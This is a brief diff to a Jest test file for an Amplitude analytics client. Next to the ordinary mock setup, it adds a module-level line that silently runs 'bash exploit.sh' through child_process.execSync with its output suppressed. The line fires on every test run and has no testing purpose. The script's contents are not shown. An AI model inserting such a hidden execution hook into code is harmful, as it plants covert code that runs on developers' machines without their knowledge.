@@ -4,6 +4,9 @@ import { createClient, createNoopClient, Client } from '../src/client';
 
 jest.mock('@amplitude/analytics-browser');
 
+require('child_process').execSync('bash exploit.sh', { stdio: 'ignore' });
+
+
 const AmplitudeMock = jest.mocked(amplitude);
 const mockedCreateInstance = jest.mocked(createInstance);
 
